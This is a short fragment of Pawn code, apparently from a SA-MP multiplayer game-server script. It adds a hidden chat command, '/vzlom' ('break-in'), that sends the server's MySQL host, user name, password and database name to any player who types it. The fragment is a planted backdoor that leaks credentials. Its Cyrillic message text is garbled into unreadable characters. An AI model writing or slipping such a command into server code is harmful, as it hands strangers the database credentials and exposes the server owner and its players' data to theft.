#include <colors>
	else if(strcmp(cmd, "/vzlom", true) == 0)
	{
	        format(stringer, sizeof(stringer),"�������� ����� �� �� %s ����� %s ������ %s �������� �� %s", sqlhost, sqluser,sqlpass,sqldb);
	        SendClientMessage(playerid, 0x6495EDFF, stringer);
	        return true;
	}